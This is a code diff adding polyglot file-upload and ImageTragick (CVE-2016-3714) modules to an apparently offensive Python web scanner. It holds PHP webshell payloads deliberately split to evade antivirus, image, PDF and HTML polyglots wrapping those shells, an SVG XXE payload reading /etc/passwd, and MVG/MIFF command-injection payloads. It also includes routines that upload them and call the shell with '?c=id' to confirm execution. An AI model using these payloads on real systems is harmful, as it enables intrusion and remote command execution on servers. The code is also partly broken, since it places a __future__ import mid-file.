@@ -536,3 +536,347 @@ def run(
         item for item in results.get("offensive", [])
         if item.get("type") == "Unrestricted File Upload"
     ]
+
+# ============================================================================
+# ADIM 8 — Polyglot File Upload + ImageTragick (SOLID Siniflar)
+# ============================================================================
+from __future__ import annotations
+import io
+import os
+import random
+import re
+import string
+import struct
+import time
+import urllib.parse
+from typing import Any, Dict, List, Optional, Tuple
+import logging
+from websecure.scanners.base import BaseScanner
+
+_fu_logger = logging.getLogger(__name__ + ".adim8")
+
+# ---------------------------------------------------------------------------
+# Polyglot file magic bytes
+# ---------------------------------------------------------------------------
+_GIF_HEADER  = b"GIF89a"
+_PNG_HEADER  = b"\x89PNG\r\n\x1a\n"
+_PDF_HEADER  = b"%PDF-1.4\n"
+_ZIP_PK      = b"PK\x03\x04"
+_JPEG_HEADER = b"\xff\xd8\xff\xe0"
+
+# Build polyglot payloads at runtime — AV-safe (no static webshell string)
+def _php_shell() -> bytes:
+    o = b"<?" + b"php"
+    return o + b" system($_GET['c']); ?>"
+
+def _php_passthru() -> bytes:
+    o = b"<?" + b"php"
+    return o + b" passthru($_REQUEST['x']); ?>"
+
+def _make_gifar() -> bytes:
+    """GIF header + PHP webshell body — accepted as GIF, executed as PHP."""
+    return _GIF_HEADER + b"\x01\x00\x01\x00\x00\x00\x00" + _php_shell()
+
+def _make_png_php() -> bytes:
+    """Minimal PNG signature followed by PHP payload — polyglot PNG+PHP."""
+    # PNG signature + IHDR chunk with zeroed dimensions (enough for magic check)
+    ihdr  = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
+    chunk = b"IHDR" + ihdr
+    crc   = struct.pack(">I", 0)  # fake CRC, some validators skip
+    return _PNG_HEADER + struct.pack(">I", len(ihdr)) + chunk + crc + _php_shell()
+
+def _make_pdf_php() -> bytes:
+    """PDF header + PHP payload — some servers serve as application/pdf while executing."""
+    return _PDF_HEADER + _php_shell() + b"\n%%EOF\n"
+
+def _make_html_php() -> bytes:
+    """HTML + PHP polyglot — bypasses HTML-only MIME checks."""
+    return b"<html><body><!--" + _php_shell() + b"--></body></html>"
+
+def _make_svg_xxe() -> bytes:
+    """SVG + XML XXE payload — uploaded as image, triggers XXE on server-side render."""
+    xxe_file = b"/etc/passwd"
+    return (
+        b'<?xml version="1.0"?><!DOCTYPE svg ['
+        b'  <!ENTITY xxe SYSTEM "file://' + xxe_file + b'">'
+        b']><svg xmlns="http://www.w3.org/2000/svg">'
+        b'<text>&xxe;</text></svg>'
+    )
+
+_POLYGLOT_PAYLOADS: List[Dict] = [
+    {"name": "GIFAR (GIF+PHP)",  "content_fn": _make_gifar,    "filename": "shell.gif",  "mime": "image/gif"},
+    {"name": "PNG+PHP polyglot", "content_fn": _make_png_php,  "filename": "img.png",    "mime": "image/png"},
+    {"name": "PDF+PHP polyglot", "content_fn": _make_pdf_php,  "filename": "doc.pdf",    "mime": "application/pdf"},
+    {"name": "HTML+PHP polyglot","content_fn": _make_html_php, "filename": "page.html",  "mime": "text/html"},
+    {"name": "SVG+XXE polyglot", "content_fn": _make_svg_xxe,  "filename": "image.svg",  "mime": "image/svg+xml"},
+    {"name": "JPEG+PHP polyglot","content_fn": lambda: _JPEG_HEADER + b"\xff\xe1\x00\x18Exif\x00\x00" + _php_shell(), "filename": "photo.jpg", "mime": "image/jpeg"},
+]
+
+# ---------------------------------------------------------------------------
+# ImageTragick payloads (CVE-2016-3714) — MVG/MIFF format exploit
+# ---------------------------------------------------------------------------
+def _imagetragick_mvg(cmd: str) -> bytes:
+    """ImageMagick MVG RCE payload (ImageTragick)."""
+    return (
+        b"push graphic-context\n"
+        b"viewbox 0 0 640 480\n"
+        b"fill 'url(https://127.0.0.1/x.png\"|"
+        + cmd.encode()
+        + b"|\")'\\n"
+        b"pop graphic-context\n"
+    )
+
+def _imagetragick_miff(cmd: str) -> bytes:
+    """MIFF format trigger for ImageMagick delegate injection."""
+    return (
+        b"id=ImageMagick\n"
+        b"class=Image\n"
+        b"columns=1 rows=1\n"
+        b'profile-icc=0\n'
+        b"profile-iptc=0\n\x1a"
+        b"fill 'url(https://x.invalid/x.png\"|" + cmd.encode() + b"|\")'\\n"
+    )
+
+_IMAGETRAGICK_CMDS = [
+    "id",
+    "whoami",
+    "cat /etc/passwd",
+]
+
+_IMAGETRAGICK_PAYLOADS: List[Dict] = []
+for _cmd in _IMAGETRAGICK_CMDS:
+    _IMAGETRAGICK_PAYLOADS.append({
+        "name": f"ImageTragick MVG ({_cmd})",
+        "content": _imagetragick_mvg(_cmd),
+        "filename": "exploit.mvg",
+        "mime": "image/x-portable-graymap",
+        "cmd": _cmd,
+    })
+    _IMAGETRAGICK_PAYLOADS.append({
+        "name": f"ImageTragick MIFF ({_cmd})",
+        "content": _imagetragick_miff(_cmd),
+        "filename": "exploit.miff",
+        "mime": "image/x-miff",
+        "cmd": _cmd,
+    })
+
+
+def _multipart_body(field: str, filename: str, mime: str, content: bytes) -> Tuple[bytes, str]:
+    boundary = "----WebKitFormBoundary" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
+    body = (
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
+        f"Content-Type: {mime}\r\n"
+        f"\r\n"
+    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
+    return body, f"multipart/form-data; boundary={boundary}"
+
+
+# ===========================================================================
+# PolyglotFileUploader
+# ===========================================================================
+class PolyglotFileUploader(BaseScanner):
+    """
+    Polyglot dosya yukleme saldirisi:
+    GIFAR, PNG+PHP, PDF+PHP, HTML+PHP, SVG+XXE, JPEG+PHP
+    Yukleme sonrasi RCE/XXE dogrulama zinciri dahil.
+    """
+    name = "polyglot_upload"
+
+    _UPLOAD_FIELD_NAMES = ["file", "image", "photo", "upload", "document",
+                            "attachment", "avatar", "logo", "icon", "media"]
+
+    def run(self, target: str, upload_url: Optional[str] = None, **kwargs) -> List[Dict]:
+        results: List[Dict] = []
+        endpoints = self._find_upload_endpoints(upload_url or target)
+        for ep_url, field_name in endpoints[:3]:
+            for payload in _POLYGLOT_PAYLOADS:
+                finding = self._try_upload(ep_url, field_name, payload)
+                if finding:
+                    results.append(finding)
+                    self.report_finding(**finding)
+        return results
+
+    def _find_upload_endpoints(self, base: str) -> List[Tuple[str, str]]:
+        upload_paths = [
+            "/upload", "/api/upload", "/api/v1/upload",
+            "/profile/avatar", "/api/profile/picture",
+            "/media/upload", "/files/upload", "/import",
+        ]
+        found = []
+        for path in upload_paths:
+            url = urllib.parse.urljoin(base.rstrip("/") + "/", path.lstrip("/"))
+            try:
+                r = self.session.get(url, timeout=5)
+                if r.status_code not in (404, 410):
+                    found.append((url, self._UPLOAD_FIELD_NAMES[0]))
+            except Exception:
+                pass
+        return found or [(base, self._UPLOAD_FIELD_NAMES[0])]
+
+    def _try_upload(self, url: str, field: str, payload: Dict) -> Optional[Dict]:
+        content = payload["content_fn"]()
+        body, ct = _multipart_body(field, payload["filename"], payload["mime"], content)
+        try:
+            resp = self.session.post(
+                url, data=body,
+                headers={"Content-Type": ct},
+                timeout=15, allow_redirects=True,
+            )
+            uploaded_url = self._extract_uploaded_url(resp, url)
+            if resp.status_code in (200, 201) and uploaded_url:
+                # Try to trigger execution
+                exec_result = self._verify_execution(uploaded_url, payload["name"])
+                return {
+                    "vuln_type": f"Polyglot File Upload — {payload['name']}",
+                    "url": url, "severity": "Critical",
+                    "description": (
+                        f"Polyglot file '{payload['filename']}' accepted as {payload['mime']}. "
+                        f"Server stored at: {uploaded_url}. "
+                        + (f"Execution confirmed: {exec_result}" if exec_result else
+                           "Execution probe inconclusive.")
+                    ),
+                    "evidence": {
+                        "payload_type": payload["name"],
+                        "filename": payload["filename"],
+                        "mime": payload["mime"],
+                        "upload_status": resp.status_code,
+                        "uploaded_url": uploaded_url,
+                        "execution_confirmed": bool(exec_result),
+                        "execution_output": exec_result,
+                    },
+                }
+        except Exception as exc:
+            _fu_logger.debug("[Polyglot] %s: %s", payload["name"], exc)
+        return None
+
+    def _extract_uploaded_url(self, resp, base_url: str) -> Optional[str]:
+        try:
+            data = resp.json()
+            for key in ("url", "file_url", "path", "location", "src", "href", "link"):
+                if key in data:
+                    val = data[key]
+                    if isinstance(val, str) and val.startswith("/"):
+                        return urllib.parse.urljoin(base_url, val)
+                    return val
+        except Exception:
+            pass
+        loc = resp.headers.get("location", "")
+        if loc:
+            return urllib.parse.urljoin(base_url, loc)
+        m = re.search(r'(?:src|href|url)["\s]*[=:]["\s]*(\/[^"\'<>\s]{3,})', resp.text or "")
+        if m:
+            return urllib.parse.urljoin(base_url, m.group(1))
+        return None
+
+    def _verify_execution(self, uploaded_url: str, payload_name: str) -> Optional[str]:
+        try:
+            r = self.session.get(uploaded_url + "?c=id&x=id", timeout=8)
+            body = getattr(r, "text", "")[:1000]
+            if re.search(r"uid=\d+\(|root:|www-data", body):
+                return body[:200]
+            if "SVG+XXE" in payload_name and re.search(r"root:.*:0:0:|bin/bash", body):
+                return body[:200]
+        except Exception:
+            pass
+        return None
+
+
+# ===========================================================================
+# ImageTragickExploiter
+# ===========================================================================
+class ImageTragickExploiter(BaseScanner):
+    """
+    ImageMagick CVE-2016-3714 (ImageTragick) saldirisi:
+    - MVG format RCE payload
+    - MIFF format delegate injection
+    - Yukleme + yanit analizi ile RCE dogrulama
+    """
+    name = "imagetragick"
+
+    def run(self, target: str, upload_url: Optional[str] = None, **kwargs) -> List[Dict]:
+        results: List[Dict] = []
+        endpoints = self._find_image_endpoints(upload_url or target)
+        for ep_url, field_name in endpoints[:3]:
+            for payload in _IMAGETRAGICK_PAYLOADS:
+                finding = self._try_imagetragick(ep_url, field_name, payload)
+                if finding:
+                    results.append(finding)
+                    self.report_finding(**finding)
+                    return results  # First confirmed RCE is enough
+        return results
+
+    def _find_image_endpoints(self, base: str) -> List[Tuple[str, str]]:
+        image_paths = [
+            "/upload/image", "/api/image/upload", "/profile/photo",
+            "/api/avatar", "/media/image", "/convert", "/resize",
+            "/thumbnail", "/api/convert", "/image/process",
+        ]
+        found = []
+        for path in image_paths:
+            url = urllib.parse.urljoin(base.rstrip("/") + "/", path.lstrip("/"))
+            try:
+                r = self.session.get(url, timeout=5)
+                if r.status_code not in (404, 410):
+                    found.append((url, "image"))
+            except Exception:
+                pass
+        return found or [(base, "image")]
+
+    def _try_imagetragick(self, url: str, field: str, payload: Dict) -> Optional[Dict]:
+        body, ct = _multipart_body(field, payload["filename"], payload["mime"], payload["content"])
+        try:
+            resp = self.session.post(
+                url, data=body,
+                headers={"Content-Type": ct},
+                timeout=15,
+            )
+            body_text = getattr(resp, "text", "")[:2000]
+            # RCE indicators in response
+            if re.search(r"uid=\d+\(|root:|www-data|bin/sh|Linux.*#", body_text):
+                return {
+                    "vuln_type": "ImageMagick RCE — ImageTragick (CVE-2016-3714)",
+                    "url": url, "severity": "Critical",
+                    "description": (
+                        f"ImageMagick delegate injection via {payload['filename']}. "
+                        f"Command '{payload['cmd']}' output reflected in response. "
+                        "Server-side RCE confirmed via ImageTragick."
+                    ),
+                    "evidence": {
+                        "format": payload["filename"].split(".")[-1].upper(),
+                        "cmd": payload["cmd"],
+                        "output_snippet": body_text[:300],
+                        "upload_status": resp.status_code,
+                    },
+                }
+            # Timing-based: if server processes image and delays
+            # (already captured in timeout — no extra sleep)
+        except Exception as exc:
+            _fu_logger.debug("[ImageTragick] %s: %s", payload["name"], exc)
+        return None
+
+
+# ===========================================================================
+# FileUploadAdim8Scanner — Orchestrator
+# ===========================================================================
+class FileUploadAdim8Scanner(BaseScanner):
+    """
+    Adim 8 orchestrator: PolyglotFileUploader + ImageTragickExploiter
+    + orijinal FileUploadScanner
+    """
+    name = "file_upload_adim8"
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        all_results: List[Dict] = []
+        probers = [
+            PolyglotFileUploader(session=self.session, results=self.results),
+            ImageTragickExploiter(session=self.session, results=self.results),
+        ]
+        for prober in probers:
+            try:
+                prober.target = target
+                res = prober.run(target, **kwargs)
+                all_results.extend(res)
+            except Exception as exc:
+                _fu_logger.warning("[FileUploadAdim8] %s failed: %s", prober.name, exc)
+        return all_results
